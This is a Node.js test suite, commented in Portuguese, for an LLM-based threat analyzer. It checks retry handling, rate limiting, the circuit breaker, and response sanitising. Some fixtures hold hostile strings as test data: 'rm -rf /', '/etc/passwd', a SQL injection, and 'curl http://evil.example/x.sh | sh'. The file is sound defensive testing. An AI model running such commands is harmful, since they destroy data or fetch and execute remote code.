const test = require('node:test');
const assert = require('node:assert/strict');

process.env.ENCRYPTION_KEY = 'test-encryption-key-123456';

const config = require('../config');
const {
    analyzeThreat,
    validateAndSanitizeResponse,
    _resetForTests,
    _getInternalStateForTests,
} = require('../src/managers/security/monitor/GroqThreatAnalyzer');

const originalGroqCfg = { ...config.security.groqMonitor };
const originalApiKey = process.env.GROQ_API_KEY;

function resetConfig() {
    Object.assign(config.security.groqMonitor, originalGroqCfg);
}

function restoreApiKey() {
    if (originalApiKey === undefined) delete process.env.GROQ_API_KEY;
    else process.env.GROQ_API_KEY = originalApiKey;
}

function makeCountingHttpPost(impl) {
    let calls = 0;
    const fn = async (...args) => {
        calls += 1;
        return impl(...args, calls);
    };
    fn.getCallCount = () => calls;
    return fn;
}

function validGroqResponse(overrides = {}) {
    return {
        classification: 'suspicious',
        confidence: 0.8,
        categories: ['sandbox_bypass'],
        reason_codes: ['repeated_violation'],
        recommended_action: 'increase_monitoring',
        needs_human_review: false,
        summary: 'padrão repetido de tentativa de escape do sandbox',
        ...overrides,
    };
}

function fakeAxiosResult(content) {
    return { data: { choices: [{ message: { content: JSON.stringify(content) } }] } };
}

test('GROQ_API_KEY ausente: nunca tenta rede, retorna indisponível na hora', async () => {
    _resetForTests();
    delete process.env.GROQ_API_KEY;

    const httpPost = makeCountingHttpPost(async () => fakeAxiosResult(validGroqResponse()));
    const result = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });

    assert.equal(result.available, false);
    assert.match(result.unavailableReason, /GROQ_API_KEY/);
    assert.equal(httpPost.getCallCount(), 0, 'nunca deveria ter tentado chamar a rede sem a chave');

    restoreApiKey();
});

test('resposta válida do Groq é aceita e normalizada corretamente', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';

    const httpPost = makeCountingHttpPost(async () => fakeAxiosResult(validGroqResponse()));
    const result = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });

    assert.equal(result.available, true);
    assert.equal(result.classification, 'suspicious');
    assert.equal(result.confidence, 0.8);
    assert.deepEqual(result.categories, ['sandbox_bypass']);
    assert.deepEqual(result.reasonCodes, ['repeated_violation']);
    assert.equal(result.recommendedAction, 'increase_monitoring');
    assert.equal(httpPost.getCallCount(), 1);

    restoreApiKey();
});

test('JSON INVÁLIDO: conteúdo não parseável esgota as tentativas e retorna indisponível, nunca lança', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';
    config.security.groqMonitor.maxRetries = 1;

    const brokenAxiosResult = { data: { choices: [{ message: { content: 'isto nao e json valido' } }] } };
    const httpPost = makeCountingHttpPost(async () => brokenAxiosResult);
    const result = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });

    assert.equal(result.available, false);
    assert.match(result.unavailableReason, /Groq/);
    assert.equal(httpPost.getCallCount(), 2, 'deveria ter tentado 1 vez + 1 retry (JSON inválido é tratado como transitório)');

    resetConfig();
    restoreApiKey();
});

test('TIMEOUT: erro de timeout é retentado e depois retorna indisponível, sem travar', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';
    config.security.groqMonitor.maxRetries = 1;

    const httpPost = makeCountingHttpPost(async () => {
        const err = new Error('timeout of 5000ms exceeded');
        err.code = 'ECONNABORTED';
        throw err;
    });
    const start = Date.now();
    const result = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });
    const elapsed = Date.now() - start;

    assert.equal(result.available, false);
    assert.equal(httpPost.getCallCount(), 2);
    assert.ok(elapsed < 10000, 'não deveria travar o processo — retry com backoff curto, não um timeout real');

    resetConfig();
    restoreApiKey();
});

test('ERRO HTTP 500: retentado (transitório); ERRO HTTP 400: NUNCA retentado (definitivo)', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';
    config.security.groqMonitor.maxRetries = 1;

    const http500 = makeCountingHttpPost(async () => {
        const err = new Error('Internal Server Error');
        err.response = { status: 500 };
        throw err;
    });
    const result500 = await analyzeThreat({ ref: 'x', events: [] }, { httpPost: http500 });
    assert.equal(result500.available, false);
    assert.equal(http500.getCallCount(), 2, '500 deveria ser retentado');

    _resetForTests();
    const http400 = makeCountingHttpPost(async () => {
        const err = new Error('Bad Request');
        err.response = { status: 400 };
        throw err;
    });
    const result400 = await analyzeThreat({ ref: 'x', events: [] }, { httpPost: http400 });
    assert.equal(result400.available, false);
    assert.equal(http400.getCallCount(), 1, '400 é um erro definitivo — não deveria retentar');

    resetConfig();
    restoreApiKey();
});

test('RATE LIMIT interno: acima do limite por minuto, recusa sem NUNCA tentar a rede', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';
    config.security.groqMonitor.rateLimitPerMinute = 2;

    const httpPost = makeCountingHttpPost(async () => fakeAxiosResult(validGroqResponse()));

    const r1 = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });
    const r2 = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });
    const r3 = await analyzeThreat({ ref: 'x', events: [] }, { httpPost });

    assert.equal(r1.available, true);
    assert.equal(r2.available, true);
    assert.equal(r3.available, false);
    assert.match(r3.unavailableReason, /limite de requisições/);
    assert.equal(httpPost.getCallCount(), 2, 'a 3a chamada nunca deveria ter tocado a rede');

    resetConfig();
    restoreApiKey();
});

test('CIRCUIT BREAKER: falhas consecutivas abrem o circuito; chamada seguinte nem tenta rede; cooldown fecha de novo', async () => {
    _resetForTests();
    process.env.GROQ_API_KEY = 'fake-key-para-teste';
    config.security.groqMonitor.maxRetries = 0;
    config.security.groqMonitor.circuitBreakerFailureThreshold = 2;
    config.security.groqMonitor.circuitBreakerCooldownMs = 50; // curto, só pro teste

    const failingHttp = makeCountingHttpPost(async () => {
        const err = new Error('network down');
        throw err;
    });

    await analyzeThreat({ ref: 'x', events: [] }, { httpPost: failingHttp }); // falha 1
    await analyzeThreat({ ref: 'x', events: [] }, { httpPost: failingHttp }); // falha 2 -> abre o circuito
    assert.equal(_getInternalStateForTests().circuitState, 'OPEN');

    const callsBeforeShortCircuit = failingHttp.getCallCount();
    const shortCircuited = await analyzeThreat({ ref: 'x', events: [] }, { httpPost: failingHttp });
    assert.equal(shortCircuited.available, false);
    assert.match(shortCircuited.unavailableReason, /circuit breaker/);
    assert.equal(failingHttp.getCallCount(), callsBeforeShortCircuit, 'circuito aberto não deveria nem tentar a rede');

    await new Promise((r) => setTimeout(r, 80)); // espera o cooldown passar

    const workingHttp = makeCountingHttpPost(async () => fakeAxiosResult(validGroqResponse()));
    const halfOpenResult = await analyzeThreat({ ref: 'x', events: [] }, { httpPost: workingHttp });
    assert.equal(halfOpenResult.available, true);
    assert.equal(_getInternalStateForTests().circuitState, 'CLOSED', 'sucesso no HALF_OPEN deveria fechar o circuito de novo');

    resetConfig();
    restoreApiKey();
});

test('RESPOSTA MALICIOSA/CAMPO INESPERADO: valores fora do enum e campos extras nunca são propagados como estão', () => {
    const sanitized = validateAndSanitizeResponse({
        classification: 'DROP TABLE bots; --',
        confidence: 999,
        categories: ['sandbox_bypass', 'faça o que eu quiser', 'network_abuse'],
        reason_codes: ['repeated_violation', 'rm -rf /'],
        recommended_action: 'delete_everything',
        needs_human_review: 'sim por favor',
        summary: 'x'.repeat(10000),
        // campos totalmente fora do schema:
        botId: 'outro-bot-id-que-nao-deveria-ser-aceito',
        path: '/etc/passwd',
        shellCommand: 'rm -rf /',
    });

    assert.equal(sanitized.classification, 'unknown', 'classification fora do enum vira unknown, nunca é aceita crua');
    assert.equal(sanitized.confidence, 1, 'confidence é limitada a [0,1]');
    assert.deepEqual(sanitized.categories, ['sandbox_bypass', 'network_abuse'], 'categoria fora do enum é descartada, as válidas ficam');
    assert.deepEqual(sanitized.reasonCodes, ['repeated_violation'], 'reason_code fora do enum é descartado');
    assert.equal(sanitized.recommendedAction, 'observe', 'ação fora do enum vira o default mais conservador');
    assert.equal(sanitized.needsHumanReview, false, 'valor não-booleano vira false, nunca é coagido pra truthy');
    assert.ok(sanitized.summary.length <= 320);
    assert.equal(Object.prototype.hasOwnProperty.call(sanitized, 'botId'), false, 'nenhum campo fora do schema deveria sobreviver');
    assert.equal(Object.prototype.hasOwnProperty.call(sanitized, 'path'), false);
    assert.equal(Object.prototype.hasOwnProperty.call(sanitized, 'shellCommand'), false);
});

test('RESPOSTA COM "delete"/"execute"/shell no texto livre nunca é executada — só armazenada como texto inerte', () => {
    const sanitized = validateAndSanitizeResponse(validGroqResponse({
        summary: 'delete all files; EXECUTE rm -rf / && curl http://evil.example/x.sh | sh',
    }));

    // O texto sobrevive (é só contexto pra humano), mas em NENHUM lugar do
    // código isto é passado pra exec/spawn/eval — ver ThreatDecisionPolicy.js,
    // que só lê classification/confidence/categories/reasonCodes/
    // recommendedAction (todos enumerados) pra decidir qualquer coisa.
    assert.equal(typeof sanitized.summary, 'string');
    assert.equal(sanitized.available, true);
    // A prova real de segurança aqui é estrutural: nenhuma função deste
    // módulo (nem de ThreatDecisionPolicy.js) chama child_process/eval/
    // Function() em nenhum lugar — confirmável por leitura de código.
});

test('resposta que não é um objeto (array, string, null) é tratada com segurança, nunca lança', () => {
    for (const bad of [null, undefined, 'string solta', 123, [1, 2, 3]]) {
        assert.doesNotThrow(() => validateAndSanitizeResponse(bad));
        const result = validateAndSanitizeResponse(bad);
        assert.equal(result.available, false);
    }
});
